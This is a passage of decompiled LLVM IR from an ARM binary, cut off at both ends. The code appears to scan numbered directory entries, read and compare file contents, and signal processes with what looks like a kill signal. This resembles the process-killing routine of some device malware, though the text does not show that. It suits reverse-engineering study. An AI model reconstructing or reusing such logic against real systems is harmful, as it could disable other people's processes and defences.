  %v8_dd64 = icmp eq i8 %v3_dd5c, 32
  %v1_dd68 = add i32 %v0_dd6813, 1
  store i32 %v1_dd68, i32* @r5, align 4
  %v1_dd6c = add i32 %v0_dd6c15, 1
  br i1 %v8_dd64, label %dec_label_pc_dd74, label %dec_label_pc_dd5c

dec_label_pc_dd74:                                ; preds = %bb132, %bb131, %.thread12, %.thread10
  %v1_dd80 = phi i32 [ %v1_dd6814, %.thread12 ], [ %v1_dd34, %.thread10 ], [ %v1_dd34, %bb131 ], [ %v1_dd68, %bb132 ]
  %v0_dd74 = load i32, i32* @r6, align 4
  %v2_dd74 = add i32 %v0_dd74, %v1_dd34
  store i32 %v2_dd74, i32* @r4, align 4
  %v2_dd80 = add i32 %v1_dd80, %v2_dd38
  store i32 0, i32* @r7, align 4
  %v3_dd88 = add i32 %v2_dd80, -545
  %v4_dd88 = inttoptr i32 %v3_dd88 to i8*
  store i8 0, i8* %v4_dd88, align 1
  %v0_dd8c = load i32, i32* @r4, align 4
  %v1_dd90 = inttoptr i32 %v0_dd8c to i8*
  %v2_dd90 = call i32 @function_12370(i8* %v1_dd90)
  store i32 %v2_dd90, i32* @r1, align 4
  %v0_dd9c = load i32, i32* @r4, align 4
  %v3_dda0 = inttoptr i32 %v0_dd9c to i8*
  %v4_dda0 = call i32 @function_126cc(i8* %v3_dda0, i32 %v2_dd90, i32 %v2_dc74)
  %v7_dda4 = icmp eq i32 %v4_dda0, -1
  br i1 %v7_dda4, label %dec_label_pc_dcd8.backedge, label %dec_label_pc_ddc0.preheader

dec_label_pc_ddc0.preheader:                      ; preds = %dec_label_pc_dd74
  %v1_dda8 = load i32, i32* @r7, align 4
  %v1_ddac = load i32, i32* @r6, align 4
  %v2_ddac = load i32, i32* @r5, align 4
  %v3_ddac = add i32 %v2_ddac, %v1_ddac
  store i32 %v1_dda8, i32* @lr, align 4
  %v1_ddc046 = add i32 %v3_ddac, 2
  %v2_ddc047 = inttoptr i32 %v1_ddc046 to i8*
  %v3_ddc048 = load i8, i8* %v2_ddc047, align 1
  %v2_ddc450 = icmp eq i8 %v3_ddc048, 0
  %v1_ddc852 = add i32 %v2_ddac, 2
  br i1 %v2_ddc450, label %dec_label_pc_ddf8, label %dec_label_pc_ddd0

dec_label_pc_ddd0:                                ; preds = %dec_label_pc_ddc0.preheader, %dec_label_pc_ddc0.backedge
  %v0_ddf881 = phi i32 [ %v0_ddf879, %dec_label_pc_ddc0.backedge ], [ %v1_dda8, %dec_label_pc_ddc0.preheader ]
  %v0_dde0.pr = phi i32 [ %v0_dde0.pr68, %dec_label_pc_ddc0.backedge ], [ %v1_dda8, %dec_label_pc_ddc0.preheader ]
  %v0_e104 = phi i32 [ %v0_e10471, %dec_label_pc_ddc0.backedge ], [ %v1_dda8, %dec_label_pc_ddc0.preheader ]
  %v0_ddc876 = phi i32 [ %v1_ddc8, %dec_label_pc_ddc0.backedge ], [ %v1_ddc852, %dec_label_pc_ddc0.preheader ]
  %v0_ddf0 = phi i32 [ %v0_ddc0, %dec_label_pc_ddc0.backedge ], [ %v3_ddac, %dec_label_pc_ddc0.preheader ]
  %v1_ddd4.in = phi i8 [ %v3_ddc0, %dec_label_pc_ddc0.backedge ], [ %v3_ddc048, %dec_label_pc_ddc0.preheader ]
  %v7_ddd0 = icmp eq i8 %v1_ddd4.in, 9
  br i1 %v7_ddd0, label %bb134, label %bb133

bb133:                                            ; preds = %dec_label_pc_ddd0
  %v8_ddd4 = icmp eq i8 %v1_ddd4.in, 32
  br i1 %v8_ddd4, label %.thread24, label %dec_label_pc_dde0

.thread24:                                        ; preds = %bb133
  br label %dec_label_pc_ddec

bb134:                                            ; preds = %dec_label_pc_ddd0
  br label %dec_label_pc_ddec

dec_label_pc_dde0:                                ; preds = %bb133
  %v7_dde0 = icmp eq i32 %v0_dde0.pr, 1
  br i1 %v7_dde0, label %dec_label_pc_e104, label %dec_label_pc_dde8

dec_label_pc_dde8:                                ; preds = %dec_label_pc_e104, %dec_label_pc_dde0
  %v0_ddec73 = phi i32 [ %v1_e104, %dec_label_pc_e104 ], [ %v0_e104, %dec_label_pc_dde0 ]
  br label %dec_label_pc_ddec

dec_label_pc_ddec:                                ; preds = %bb134, %.thread24, %dec_label_pc_dde8
  %v0_ddec = phi i32 [ %v0_e104, %.thread24 ], [ %v0_e104, %bb134 ], [ %v0_ddec73, %dec_label_pc_dde8 ]
  %v0_dde0.pr69 = phi i32 [ 1, %.thread24 ], [ 1, %bb134 ], [ 0, %dec_label_pc_dde8 ]
  %v7_ddf4 = icmp sgt i32 %v0_ddec, 6
  br i1 %v7_ddf4, label %dec_label_pc_ddf8, label %dec_label_pc_ddc0.backedge

dec_label_pc_ddf8:                                ; preds = %dec_label_pc_ddc0.backedge, %dec_label_pc_ddec, %dec_label_pc_ddc0.preheader
  %v1_de44 = phi i32 [ %v1_ddc852, %dec_label_pc_ddc0.preheader ], [ %v1_ddc8, %dec_label_pc_ddc0.backedge ], [ %v0_ddc876, %dec_label_pc_ddec ]
  %v0_ddf8 = phi i32 [ %v1_dda8, %dec_label_pc_ddc0.preheader ], [ %v0_ddf879, %dec_label_pc_ddc0.backedge ], [ %v0_ddf881, %dec_label_pc_ddec ]
  %v2_ddf8 = icmp eq i32 %v0_ddf8, 0
  br i1 %v2_ddf8, label %dec_label_pc_dcd8.backedge, label %dec_label_pc_de04

dec_label_pc_de04:                                ; preds = %dec_label_pc_ddf8
  %v2_de0c = add i32 %v1_de44, %v2_dd38
  %v1_de10 = add i32 %v2_de0c, -545
  %v2_de10 = inttoptr i32 %v1_de10 to i8*
  %v3_de10 = load i8, i8* %v2_de10, align 1
  %v2_de14 = icmp eq i8 %v3_de10, 0
  br i1 %v2_de14, label %dec_label_pc_de38, label %bb135

bb135:                                            ; preds = %dec_label_pc_de04
  %v8_de18 = icmp eq i8 %v3_de10, 32
  br i1 %v8_de18, label %dec_label_pc_de38, label %dec_label_pc_de20

dec_label_pc_de20:                                ; preds = %bb135
  %v2_de20 = add i32 %v1_de44, %v1_ddac
  br label %dec_label_pc_de24

dec_label_pc_de24:                                ; preds = %bb136, %dec_label_pc_de20
  %v0_de3027 = phi i32 [ %v1_de30, %bb136 ], [ %v1_de44, %dec_label_pc_de20 ]
  %v0_de24 = phi i32 [ %v1_de24, %bb136 ], [ %v2_de20, %dec_label_pc_de20 ]
  %v1_de24 = add i32 %v0_de24, 1
  %v2_de24 = inttoptr i32 %v1_de24 to i8*
  %v3_de24 = load i8, i8* %v2_de24, align 1
  %v2_de28 = icmp eq i8 %v3_de24, 0
  br i1 %v2_de28, label %.thread26, label %bb136

.thread26:                                        ; preds = %dec_label_pc_de24
  %v1_de3028 = add i32 %v0_de3027, 1
  br label %dec_label_pc_de38

bb136:                                            ; preds = %dec_label_pc_de24
  %v8_de2c = icmp eq i8 %v3_de24, 32
  %v1_de30 = add i32 %v0_de3027, 1
  br i1 %v8_de2c, label %dec_label_pc_de38, label %dec_label_pc_de24

dec_label_pc_de38:                                ; preds = %bb136, %dec_label_pc_de04, %.thread26, %bb135
  %v1_de40 = phi i32 [ %v1_de44, %dec_label_pc_de04 ], [ %v1_de3028, %.thread26 ], [ %v1_de44, %bb135 ], [ %v1_de30, %bb136 ]
  %v2_de40 = add i32 %v1_de40, %v2_dd38
  %v2_de44 = add i32 %v1_de44, %v1_ddac
  store i32 %v2_de44, i32* @r4, align 4
  %v3_de50 = add i32 %v2_de40, -545
  %v4_de50 = inttoptr i32 %v3_de50 to i8*
  store i8 0, i8* %v4_de50, align 1
  %v1_de54 = inttoptr i32 %v2_de44 to i8*
  %v2_de54 = call i32 @function_12370(i8* %v1_de54)
  %v8_de5c = icmp sgt i32 %v2_de54, 15
  br i1 %v8_de5c, label %dec_label_pc_dcd8.backedge, label %dec_label_pc_de60

dec_label_pc_de60:                                ; preds = %dec_label_pc_de38
  %v0_de64 = load i32, i32* @r4, align 4
  %v2_de68 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_de68, i32* @r0, align 4
  %v2_de6c = bitcast i32* %stack_var_-56 to i8*
  %v3_de6c = call i32 @function_12398(i8* %v2_de6c, i32 %v0_de64)
  br label %dec_label_pc_de70

dec_label_pc_de70.loopexit:                       ; preds = %dec_label_pc_dcd8.backedge, %dec_label_pc_dcd8.preheader
  %.pre = ptrtoint i32* %stack_var_-56 to i32
  %.pre95 = bitcast i32* %stack_var_-56 to i8*
  br label %dec_label_pc_de70

dec_label_pc_de70:                                ; preds = %dec_label_pc_de70.loopexit, %dec_label_pc_de60
  %v1_de80.pre-phi = phi i8* [ %.pre95, %dec_label_pc_de70.loopexit ], [ %v2_de6c, %dec_label_pc_de60 ]
  %v2_de7c.pre-phi = phi i32 [ %.pre, %dec_label_pc_de70.loopexit ], [ %v2_de68, %dec_label_pc_de60 ]
  %v0_de70 = load i32, i32* @r8, align 4
  store i32 %v0_de70, i32* @r0, align 4
  %v1_de74 = call i32 @function_15b6c(i32 %v0_de70)
  %v2_de80 = call i32 @function_12370(i8* %v1_de80.pre-phi)
  store i32 %v2_de80, i32* @r4, align 4
  %v2_de84 = icmp eq i32 %v2_de80, 0
  br i1 %v2_de84, label %dec_label_pc_e0dc, label %dec_label_pc_de90

dec_label_pc_de90:                                ; preds = %dec_label_pc_de70
  %v3_de98 = call i32 @function_11a14(i32 6, i32* null)
  store i32 %v3_de98, i32* @r0, align 4
  %v1_de9c = call i32 @function_12c08(i32 %v3_de98)
  store i32 %v1_de9c, i32* @sb, align 4
  %v2_dea0 = icmp eq i32 %v1_de9c, 0
  br i1 %v2_dea0, label %dec_label_pc_e0d0, label %dec_label_pc_deb0.preheader

dec_label_pc_deb0.preheader:                      ; preds = %dec_label_pc_de90
  store i32 0, i32* @r5, align 4
  %v1_deb441 = inttoptr i32 %v1_de9c to i32*
  %v2_deb442 = call i32 @function_12c54(i32* %v1_deb441)
  %v2_deb844 = icmp eq i32 %v2_deb442, 0
  br i1 %v2_deb844, label %dec_label_pc_e0c4, label %dec_label_pc_dec0.preheader

dec_label_pc_deb0.loopexit:                       ; preds = %dec_label_pc_dec8, %dec_label_pc_ded8, %dec_label_pc_df44
  %v0_deb0 = load i32, i32* @sb, align 4
  %v1_deb4 = inttoptr i32 %v0_deb0 to i32*
  %v2_deb4 = call i32 @function_12c54(i32* %v1_deb4)
  %v2_deb8 = icmp eq i32 %v2_deb4, 0
  br i1 %v2_deb8, label %dec_label_pc_e0c4, label %dec_label_pc_dec0.preheader

dec_label_pc_dec0.preheader:                      ; preds = %dec_label_pc_deb0.preheader, %dec_label_pc_deb0.loopexit
  %v0_dec888 = phi i32 [ %v2_deb4, %dec_label_pc_deb0.loopexit ], [ %v2_deb442, %dec_label_pc_deb0.preheader ]
  br label %dec_label_pc_dec0

dec_label_pc_dec0:                                ; preds = %dec_label_pc_dec0.preheader, %dec_label_pc_e0ac
  %v0_dee0 = phi i32 [ %v0_dec888, %dec_label_pc_dec0.preheader ], [ %v2_e0b8, %dec_label_pc_e0ac ]
  %v0_dec0 = load i32, i32* @r5, align 4
  %v2_dec0 = icmp eq i32 %v0_dec0, 0
  br i1 %v2_dec0, label %dec_label_pc_dec8, label %dec_label_pc_e0c4

dec_label_pc_dec8:                                ; preds = %dec_label_pc_dec0
  %v1_dec8 = add i32 %v0_dee0, 19
  %v2_dec8 = inttoptr i32 %v1_dec8 to i8*
  %v3_dec8 = load i8, i8* %v2_dec8, align 1
  %v4_dec8 = zext i8 %v3_dec8 to i32
  %v1_decc = add nsw i32 %v4_dec8, -48
  %tmp = icmp ugt i32 %v1_decc, 9
  br i1 %tmp, label %dec_label_pc_deb0.loopexit, label %dec_label_pc_ded8

dec_label_pc_ded8:                                ; preds = %dec_label_pc_dec8
  store i32 %v1_dec8, i32* @r7, align 4
  %v3_dee4 = call i32 @function_11a14(i32 6, i32* null)
  store i32 %v2_dc14, i32* @r0, align 4
  %v3_def0 = call i32 @function_12398(i8* %v3_dc34, i32 %v3_dee4)
  %v2_def8 = call i32 @function_12370(i8* %v3_dc34)
  %v0_defc = load i32, i32* @r7, align 4
  %v1_df00 = load i32, i32* @sl, align 4
  %v2_df00 = add i32 %v1_df00, %v2_def8
  store i32 %v2_df00, i32* @r0, align 4
  %v2_df04 = inttoptr i32 %v2_df00 to i8*
  %v3_df04 = call i32 @function_12398(i8* %v2_df04, i32 %v0_defc)
  %v2_df0c = call i32 @function_12370(i8* %v3_dc34)
  %v0_df10 = load i32, i32* @r5, align 4
  store i32 %v2_df0c, i32* @r4, align 4
  %v2_df1c = inttoptr i32 %v0_df10 to i32*
  %v3_df1c = call i32 @function_11a14(i32 7, i32* %v2_df1c)
  %v0_df24 = load i32, i32* @r4, align 4
  %v1_df24 = load i32, i32* @sl, align 4
  %v2_df24 = add i32 %v1_df24, %v0_df24
  store i32 %v2_df24, i32* @r0, align 4
  %v2_df28 = inttoptr i32 %v2_df24 to i8*
  %v3_df28 = call i32 @function_12398(i8* %v2_df28, i32 %v3_df1c)
  store i32 %v2_dc14, i32* @r0, align 4
  store i32 4096, i32* @r2, align 4
  %v3_df38 = call i32 @function_15c28(i32 %v2_dc14, i32 %v2_dc28, i32 4096)
  %v7_df3c = icmp eq i32 %v3_df38, -1
  br i1 %v7_df3c, label %dec_label_pc_deb0.loopexit, label %dec_label_pc_df44

dec_label_pc_df44:                                ; preds = %dec_label_pc_ded8
  %v0_df44 = load i32, i32* @r5, align 4
  %v2_df4c = inttoptr i32 %v0_df44 to i32*
  %v3_df4c = call i32 @function_11a14(i32 6, i32* %v2_df4c)
  store i32 %v2_dc14, i32* @r0, align 4
  %v3_df58 = call i32 @function_12398(i8* %v3_dc34, i32 %v3_df4c)
  %v2_df60 = call i32 @function_12370(i8* %v3_dc34)
  %v0_df64 = load i32, i32* @r7, align 4
  %v1_df68 = load i32, i32* @sl, align 4
  %v2_df68 = add i32 %v1_df68, %v2_df60
  store i32 %v2_df68, i32* @r0, align 4
  %v2_df6c = inttoptr i32 %v2_df68 to i8*
  %v3_df6c = call i32 @function_12398(i8* %v2_df6c, i32 %v0_df64)
  %v2_df74 = call i32 @function_12370(i8* %v3_dc34)
  %v0_df78 = load i32, i32* @r5, align 4
  store i32 %v2_df74, i32* @r4, align 4
  %v2_df84 = inttoptr i32 %v0_df78 to i32*
  %v3_df84 = call i32 @function_11a14(i32 9, i32* %v2_df84)
  %v0_df8c = load i32, i32* @r4, align 4
  %v1_df8c = load i32, i32* @sl, align 4
  %v2_df8c = add i32 %v1_df8c, %v0_df8c
  store i32 %v2_df8c, i32* @r0, align 4
  %v2_df90 = inttoptr i32 %v2_df8c to i8*
  %v3_df90 = call i32 @function_12398(i8* %v2_df90, i32 %v3_df84)
  store i32 %v2_dc14, i32* @r0, align 4
  %v1_df98 = call i32 @function_12c08(i32 %v2_dc14)
  store i32 %v1_df98, i32* @r8, align 4
  %v2_df9c = icmp eq i32 %v1_df98, 0
  br i1 %v2_df9c, label %dec_label_pc_deb0.loopexit, label %dec_label_pc_dfa4.preheader

dec_label_pc_dfa4.preheader:                      ; preds = %dec_label_pc_df44
  %v1_dfa836 = inttoptr i32 %v1_df98 to i32*
  %v2_dfa837 = call i32 @function_12c54(i32* %v1_dfa836)
  store i32 %v2_dfa837, i32* @r6, align 4
  %v2_dfac39 = icmp eq i32 %v2_dfa837, 0
  br i1 %v2_dfac39, label %dec_label_pc_e0ac, label %dec_label_pc_dfbcthread-pre-split

dec_label_pc_dfa4.loopexit:                       ; preds = %dec_label_pc_dfc4, %dec_label_pc_e05c
  %v0_dfa4 = load i32, i32* @r8, align 4
  %v1_dfa8 = inttoptr i32 %v0_dfa4 to i32*
  %v2_dfa8 = call i32 @function_12c54(i32* %v1_dfa8)
  store i32 %v2_dfa8, i32* @r6, align 4
  %v2_dfac = icmp eq i32 %v2_dfa8, 0
  br i1 %v2_dfac, label %dec_label_pc_e0ac, label %dec_label_pc_dfbcthread-pre-split

dec_label_pc_dfbcthread-pre-split:                ; preds = %dec_label_pc_dfa4.preheader, %dec_label_pc_dfa4.loopexit
  %v0_dfbc.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_dfbc

dec_label_pc_dfbc:                                ; preds = %dec_label_pc_dfbcthread-pre-split, %dec_label_pc_e084
  %v0_dfbc = phi i32 [ %v0_dfbc.pr, %dec_label_pc_dfbcthread-pre-split ], [ 1, %dec_label_pc_e084 ]
  %v2_dfbc = icmp eq i32 %v0_dfbc, 0
  br i1 %v2_dfbc, label %dec_label_pc_dfc4, label %dec_label_pc_e0ac

dec_label_pc_dfc4:                                ; preds = %dec_label_pc_dfbc
  %v2_dfc4 = call i32 @function_12404(i32 %v2_dc28, i32 4096)
  %v0_dfc8 = load i32, i32* @r5, align 4
  %v2_dfd0 = inttoptr i32 %v0_dfc8 to i32*
  %v3_dfd0 = call i32 @function_11a14(i32 6, i32* %v2_dfd0)
  store i32 %v2_dc14, i32* @r0, align 4
  %v3_dfdc = call i32 @function_12398(i8* %v3_dc34, i32 %v3_dfd0)
  %v2_dfe4 = call i32 @function_12370(i8* %v3_dc34)
  %v0_dfe8 = load i32, i32* @r7, align 4
  %v1_dfec = load i32, i32* @sl, align 4
  %v2_dfec = add i32 %v1_dfec, %v2_dfe4
  store i32 %v2_dfec, i32* @r0, align 4
  %v2_dff0 = inttoptr i32 %v2_dfec to i8*
  %v3_dff0 = call i32 @function_12398(i8* %v2_dff0, i32 %v0_dfe8)
  %v2_dff8 = call i32 @function_12370(i8* %v3_dc34)
  %v0_dffc = load i32, i32* @r5, align 4
  store i32 %v2_dff8, i32* @r4, align 4
  %v2_e008 = inttoptr i32 %v0_dffc to i32*
  %v3_e008 = call i32 @function_11a14(i32 9, i32* %v2_e008)
  %v0_e010 = load i32, i32* @r4, align 4
  %v1_e010 = load i32, i32* @sl, align 4
  %v2_e010 = add i32 %v1_e010, %v0_e010
  store i32 %v2_e010, i32* @r0, align 4
  %v2_e014 = inttoptr i32 %v2_e010 to i8*
  %v3_e014 = call i32 @function_12398(i8* %v2_e014, i32 %v3_e008)
  %v2_e01c = call i32 @function_12370(i8* %v3_dc34)
  %v1_e024 = load i32, i32* @sl, align 4
  %v2_e024 = add i32 %v1_e024, %v2_e01c
  store i32 %v2_e024, i32* @r0, align 4
  %v2_e028 = inttoptr i32 %v2_e024 to i8*
  %v3_e028 = call i32 @function_12398(i8* %v2_e028, i32 ptrtoint (i32* @global_var_197d0.21 to i32))
  %v2_e030 = call i32 @function_12370(i8* %v3_dc34)
  %v0_e034 = load i32, i32* @r6, align 4
  %v1_e034 = add i32 %v0_e034, 19
  %v1_e038 = load i32, i32* @sl, align 4
  %v2_e038 = add i32 %v1_e038, %v2_e030
  store i32 %v2_e038, i32* @r0, align 4
  %v2_e03c = inttoptr i32 %v2_e038 to i8*
  %v3_e03c = call i32 @function_12398(i8* %v2_e03c, i32 %v1_e034)
  store i32 %v2_dc14, i32* @r0, align 4
  store i32 4096, i32* @r2, align 4
  %v3_e04c = call i32 @function_15c28(i32 %v2_dc14, i32 %v2_dc28, i32 4096)
  %v7_e050 = icmp eq i32 %v3_e04c, -1
  br i1 %v7_e050, label %dec_label_pc_dfa4.loopexit, label %dec_label_pc_e05c

dec_label_pc_e05c:                                ; preds = %dec_label_pc_dfc4
  %v2_e05c = call i32 @function_12370(i8* %v3_dc48)
  store i32 %v2_e05c, i32* @r1, align 4
  %v4_e070 = call i32 @function_126cc(i8* %v3_dc48, i32 %v2_e05c, i32 %v2_de7c.pre-phi)
  %v7_e074 = icmp eq i32 %v4_e070, -1
  br i1 %v7_e074, label %dec_label_pc_dfa4.loopexit, label %dec_label_pc_e084

dec_label_pc_e084:                                ; preds = %dec_label_pc_e05c
  %v0_e07c = load i32, i32* @r7, align 4
  %v2_e084 = inttoptr i32 %v0_e07c to i8*
  %v3_e084 = call i32 @function_12494(i8* %v2_e084, i32 10)
  store i32 %v3_e084, i32* @r0, align 4
  %v2_e08c = call i32 @function_14e24(i32 %v3_e084, i32 9)
  %v0_e090 = load i32, i32* @r8, align 4
  %v1_e094 = inttoptr i32 %v0_e090 to i32*
  %v2_e094 = call i32 @function_12c54(i32* %v1_e094)
  store i32 %v2_e094, i32* @r6, align 4
  %v2_e098 = icmp eq i32 %v2_e094, 0
  store i32 1, i32* @r5, align 4
  br i1 %v2_e098, label %dec_label_pc_e0ac, label %dec_label_pc_dfbc

dec_label_pc_e0ac:                                ; preds = %dec_label_pc_dfa4.loopexit, %dec_label_pc_e084, %dec_label_pc_dfbc, %dec_label_pc_dfa4.preheader
  %v0_e0ac = load i32, i32* @r8, align 4
  %v1_e0b0 = inttoptr i32 %v0_e0ac to i32*
  %v2_e0b0 = call i32 @function_12bd8(i32* %v1_e0b0)
  %v0_e0b4 = load i32, i32* @sb, align 4
  %v1_e0b8 = inttoptr i32 %v0_e0b4 to i32*
  %v2_e0b8 = call i32 @function_12c54(i32* %v1_e0b8)
  %v2_e0bc = icmp eq i32 %v2_e0b8, 0
  br i1 %v2_e0bc, label %dec_label_pc_e0c4, label %dec_label_pc_dec0

dec_label_pc_e0c4:                                ; preds = %dec_label_pc_deb0.loopexit, %dec_label_pc_e0ac, %dec_label_pc_dec0, %dec_label_pc_deb0.preheader
  %v0_e0c4 = load i32, i32* @sb, align 4
  %v1_e0c8 = inttoptr i32 %v0_e0c4 to i32*
  %v2_e0c8 = call i32 @function_12bd8(i32* %v1_e0c8)
  %v0_e0cc = load i32, i32* @r5, align 4
  %v1_e0cc = urem i32 %v0_e0cc, 256
  br label %dec_label_pc_e0d0

dec_label_pc_e0d0:                                ; preds = %dec_label_pc_de90, %dec_label_pc_e0c4
  %storemerge = phi i32 [ %v1_e0cc, %dec_label_pc_e0c4 ], [ 0, %dec_label_pc_de90 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_e0d4 = call i32 @function_15c58(i32 1)
  br label %dec_label_pc_e0dc

dec_label_pc_e0dc:                                ; preds = %dec_label_pc_de70, %dec_label_pc_e0d0
  %v1_e0dc = call i32 @function_11a38(i32 6)
  %v1_e0e4 = call i32 @function_11a38(i32 7)
  %v1_e0ec = call i32 @function_11a38(i32 9)
  br label %dec_label_pc_e0f0

dec_label_pc_e0f0:                                ; preds = %dec_label_pc_dca8, %dec_label_pc_e0dc
  %v0_e0f0 = load i32, i32* @r4, align 4
  store i32 %v3_dc00, i32* @r4, align 4
  store i32 %v6_dc00, i32* @r5, align 4
  store i32 %v9_dc00, i32* @r6, align 4
  store i32 %v12_dc00, i32* @r7, align 4
  store i32 %v15_dc00, i32* @r8, align 4
  store i32 %v18_dc00, i32* @sb, align 4
  store i32 %v21_dc00, i32* @sl, align 4
  store i32 %v24_dc00, i32* @fp, align 4
  store i32 %v27_dc00, i32* @lr, align 4
  ret i32 %v0_e0f0

dec_label_pc_e104:                                ; preds = %dec_label_pc_dde0
  %v1_e104 = add i32 %v0_e104, 1
  %v7_e108 = icmp eq i32 %v0_e104, 0
  br i1 %v7_e108, label %dec_label_pc_e110, label %dec_label_pc_dde8

dec_label_pc_e110:                                ; preds = %dec_label_pc_e104
  %v1_e110 = add i32 %v0_ddf0, 3
  %v2_e110 = inttoptr i32 %v1_e110 to i8*
  %v3_e110 = load i8, i8* %v2_e110, align 1
  %v7_e114 = icmp eq i8 %v3_e110, 65
  br i1 %v7_e114, label %dec_label_pc_e128, label %dec_label_pc_e11c

dec_label_pc_e11c:                                ; preds = %dec_label_pc_e110, %dec_label_pc_e128
  %v0_ddf880 = phi i32 [ %v0_ddf881, %dec_label_pc_e110 ], [ 1, %dec_label_pc_e128 ]
  br label %dec_label_pc_ddc0.backedge

dec_label_pc_ddc0.backedge:                       ; preds = %dec_label_pc_e11c, %dec_label_pc_ddec
  %v0_ddf879 = phi i32 [ %v0_ddf880, %dec_label_pc_e11c ], [ %v0_ddf881, %dec_label_pc_ddec ]
  %v0_e10471 = phi i32 [ %v1_e104, %dec_label_pc_e11c ], [ %v0_ddec, %dec_label_pc_ddec ]
  %v0_dde0.pr68 = phi i32 [ 0, %dec_label_pc_e11c ], [ %v0_dde0.pr69, %dec_label_pc_ddec ]
  %v0_ddc0 = add i32 %v0_ddf0, 1
  %v1_ddc0 = add i32 %v0_ddf0, 3
  %v2_ddc0 = inttoptr i32 %v1_ddc0 to i8*
  %v3_ddc0 = load i8, i8* %v2_ddc0, align 1
  %v2_ddc4 = icmp eq i8 %v3_ddc0, 0
  %v1_ddc8 = add i32 %v0_ddc876, 1
  br i1 %v2_ddc4, label %dec_label_pc_ddf8, label %dec_label_pc_ddd0

dec_label_pc_e128:                                ; preds = %dec_label_pc_e110
  store i32 1, i32* @lr, align 4
  br label %dec_label_pc_e11c

dec_label_pc_e130:                                ; preds = %dec_label_pc_dc00
  store i8 48, i8* %stack_var_-72, align 1
  br label %dec_label_pc_dca8

; uselistorder directives
  uselistorder i32 %v1_ddc8, { 1, 0 }
  uselistorder i8 %v3_ddc0, { 1, 0 }
  uselistorder i32 %v0_ddf879, { 1, 0 }
  uselistorder i32 %v1_e104, { 1, 0 }
  uselistorder i32 %v2_e0b8, { 1, 0 }
  uselistorder i32 %v1_de24, { 1, 0 }
  uselistorder i32 %v0_de3027, { 1, 0 }
  uselistorder i32 %v1_de44, { 0, 3, 4, 5, 1, 2 }
  uselistorder i32 %v0_ddec, { 1, 0 }
  uselistorder i32 %v0_ddc876, { 1, 0 }
  uselistorder i32 %v0_e104, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_ddf881, { 1, 2, 0 }
  uselistorder i32 %v1_ddc852, { 1, 0 }
  uselistorder i32 %v2_ddac, { 1, 0 }
  uselistorder i32 %v1_dda8, { 3, 1, 0, 2, 4 }
  uselistorder i32 %v1_dd68, { 0, 2, 1 }
  uselistorder i32 %v0_dd6813, { 1, 0 }
  uselistorder i32 %v1_dd34, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 %v3_dcc8, { 1, 2, 0 }
  uselistorder i8* %v3_dc48, { 1, 0, 2 }
  uselistorder i32 %v2_dc28, { 1, 0, 2, 3 }
  uselistorder i32 %v2_dc14, { 1, 0, 2, 4, 3, 5, 7, 6, 8, 9 }
  uselistorder i8* %stack_var_-585, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-72, { 2, 0, 1 }
  uselistorder i32* %stack_var_-56, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32, i32)* @function_125d0, { 1, 0 }
  uselistorder label %dec_label_pc_e11c, { 1, 0 }
  uselistorder label %dec_label_pc_e0f0, { 1, 0 }
  uselistorder label %dec_label_pc_e0dc, { 1, 0 }
  uselistorder label %dec_label_pc_e0d0, { 1, 0 }
  uselistorder label %dec_label_pc_e0c4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_e0ac, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_dfbc, { 1, 0 }
  uselistorder label %dec_label_pc_dfbcthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_dfa4.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_dec0, { 1, 0 }
  uselistorder label %dec_label_pc_dec0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_deb0.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_de38, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_ddec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ddd0, { 1, 0 }
  uselistorder label %dec_label_pc_dd74, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_dcd8.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_dd28, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_dcf0, { 1, 0 }
  uselistorder label %dec_label_pc_dca8, { 1, 0 }
}

define i32 @function_e164(i32 %arg1) local_unnamed_addr {
dec_label_pc_e164:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-8412 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-4264 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %v2_e174 = call i32 @function_15b1c(i32* null)
  store i32 %v2_e174, i32* @r7, align 4
  %v0_e17c = call i32 @function_14c98()
  %v7_e180 = icmp eq i32 %v0_e17c, -1
  %. = zext i1 %v7_e180 to i32
  %tmp220 = icmp slt i32 %v0_e17c, 1
  %storemerge184 = select i1 %tmp220, i32 %., i32 1
  store i32 %storemerge184, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_22964.101 to i32), i32* %r3.global-to-local, align 4
  %v2_e19c = icmp eq i32 %storemerge184, 0
  store i32 %v0_e17c, i32* @global_var_22964.101, align 4
  br i1 %v2_e19c, label %dec_label_pc_e1b8, label %dec_label_pc_e1a8

dec_label_pc_e1a8:                                ; preds = %dec_label_pc_e390, %dec_label_pc_e164, %dec_label_pc_e270
  %v1_e1b4 = phi i32 [ %v0_e17c, %dec_label_pc_e164 ], [ %v2_e328, %dec_label_pc_e270 ], [ 0, %dec_label_pc_e390 ]
  ret i32 %v1_e1b4

dec_label_pc_e1b8:                                ; preds = %dec_label_pc_e164
  %v2_e1b8 = ptrtoint i32* %stack_var_-248 to i32
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v1_e1cc = call i32 @function_14898(i32 23)
  %v1_e1d0 = call i32 @function_dc00(i32 %v1_e1cc)
